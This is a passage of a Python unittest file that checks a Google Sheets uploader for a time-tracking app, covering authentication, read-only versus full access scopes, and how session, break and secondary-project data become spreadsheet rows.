            uploader = GoogleSheetsUploader(test_file)
            result = uploader.authenticate()

            # With real credentials, should succeed
            self.assertTrue(result, "Authentication failed with real credentials")
            self.assertIsNotNone(uploader.service)
            self.assertIsNotNone(uploader.credentials)

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsReadOnly(unittest.TestCase):
    """Test read-only mode"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.os.path.exists")
    def test_read_only_mode_uses_readonly_scopes(self, mock_exists):
        """Test that read-only mode uses readonly scopes"""
        try:
            from src.google_sheets_integration import (
                GoogleSheetsUploader,
                SCOPES_READONLY,
            )

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file(
                "test_readonly.json", settings
            )

            uploader = GoogleSheetsUploader(test_file, read_only=True)
            self.assertEqual(uploader.scopes, SCOPES_READONLY)
            self.assertTrue(uploader.read_only)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_full_mode_uses_full_scopes(self, mock_exists):
        """Test that full mode uses full scopes"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader, SCOPES_FULL

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file("test_full.json", settings)

            uploader = GoogleSheetsUploader(test_file, read_only=False)
            self.assertEqual(uploader.scopes, SCOPES_FULL)
            self.assertFalse(uploader.read_only)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsDetailedFormat(unittest.TestCase):
    """Test that Google Sheets upload uses detailed format matching CSV export"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_detailed_format_with_active_periods(self, mock_exists, mock_build):
        """Test that upload creates separate rows for each active period"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock service
            mock_service = MagicMock()
            mock_build.return_value = mock_service

            # Mock authentication
            mock_exists.return_value = True

            # Create test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_detailed_format.json", settings
            )

            # Create uploader and set authenticated service
            uploader = GoogleSheetsUploader(test_file)
            uploader.service = mock_service
            uploader.credentials = MagicMock()

            # Mock the header check
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [["Headers"]]
            }

            # Mock the append response
            mock_service.spreadsheets().values().append().execute.return_value = {
                "updates": {"updatedCells": 23}
            }

            # Create session with multiple active periods
            session_data = {
                "date": "2024-01-20",
                "sphere": "Work",
                "start_time": "10:00:00",
                "end_time": "11:00:00",
                "total_duration": 3600,
                "active_duration": 3000,
                "break_duration": 600,
                "session_comments": {
                    "active_notes": "Active session notes",
                    "break_notes": "Break notes",
                    "idle_notes": "Idle notes",
                    "session_notes": "Overall session notes",
                },
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Project A",
                        "comment": "Working on feature X",
                    },
                    {
                        "start": "10:35:00",
                        "end": "11:00:00",
                        "duration": 1500,
                        "project": "Project B",
                        "comment": "Code review",
                    },
                ],
                "breaks": [
                    {
                        "start": "10:25:00",
                        "duration": 600,
                        "action": "Coffee",
                        "comment": "Quick coffee break",
                    }
                ],
                "idle_periods": [],
            }

            # Upload session
            result = uploader.upload_session(session_data, "session_123")

            # Verify success
            self.assertTrue(result)

            # Get the call arguments
            append_call = mock_service.spreadsheets().values().append.call_args

            # Verify append was called with correct data
            self.assertIsNotNone(append_call)

            # Get the body parameter
            body = append_call[1]["body"]
            rows = body["values"]

            # Should have 3 rows: 2 active + 1 break
            self.assertEqual(len(rows), 3)

            # Verify first active row
            row1 = rows[0]
            self.assertEqual(row1[0], "session_123")  # session_id
            self.assertEqual(row1[1], "2024-01-20")  # date
            self.assertEqual(row1[2], "Work")  # sphere
            self.assertEqual(row1[8], "active")  # type
            self.assertEqual(row1[9], "Project A")  # project
            self.assertEqual(row1[13], "10:00:00")  # activity_start
            self.assertEqual(row1[14], "10:25:00")  # activity_end
            self.assertEqual(row1[15], 25.0)  # activity_duration in minutes
            self.assertEqual(row1[16], "Working on feature X")  # activity_comment

            # Verify second active row
            row2 = rows[1]
            self.assertEqual(row2[8], "active")  # type
            self.assertEqual(row2[9], "Project B")  # project
            self.assertEqual(row2[16], "Code review")  # activity_comment

            # Verify break row
            row3 = rows[2]
            self.assertEqual(row3[8], "break")  # type
            self.assertEqual(row3[17], "Coffee")  # break_action
            self.assertEqual(row3[16], "Quick coffee break")  # activity_comment

            # Verify session comments are in all rows
            for row in rows:
                self.assertEqual(row[19], "Active session notes")  # active_notes
                self.assertEqual(row[20], "Break notes")  # break_notes
                self.assertEqual(row[21], "Idle notes")  # idle_notes
                self.assertEqual(row[22], "Overall session notes")  # session_notes

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.build")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_with_secondary_projects(self, mock_exists, mock_build):
        """Test that upload handles secondary projects correctly"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock service
            mock_service = MagicMock()
            mock_build.return_value = mock_service
            mock_exists.return_value = True

            # Create test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_secondary_projects.json", settings
            )

            # Create uploader
            uploader = GoogleSheetsUploader(test_file)
            uploader.service = mock_service
            uploader.credentials = MagicMock()

            # Mock responses
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [["Headers"]]
            }
            mock_service.spreadsheets().values().append().execute.return_value = {
                "updates": {"updatedCells": 23}
            }

            # Session with secondary project
            session_data = {
                "date": "2024-01-20",
                "sphere": "Work",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "total_duration": 1800,
                "active_duration": 1800,
                "break_duration": 0,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:30:00",
                        "duration": 1800,
                        "projects": [
                            {
                                "name": "Primary Project",
                                "project_primary": True,
                            },
                            {
                                "name": "Secondary Project",
                                "project_primary": False,
                                "comment": "Supporting work",
                                "percentage": "30",
                            },
                        ],
                        "comment": "Multi-project work",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            # Upload
            result = uploader.upload_session(session_data, "session_456")
            self.assertTrue(result)

            # Get uploaded data
            body = mock_service.spreadsheets().values().append.call_args[1]["body"]
            rows = body["values"]

            # Should have 1 row
            self.assertEqual(len(rows), 1)

            row = rows[0]
            self.assertEqual(row[9], "Primary Project")  # project
            self.assertEqual(row[10], "Secondary Project")  # secondary_project
            self.assertEqual(row[11], "Supporting work")  # secondary_comment
            self.assertEqual(row[12], "30")  # secondary_percentage

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


if __name__ == "__main__":
    unittest.main()
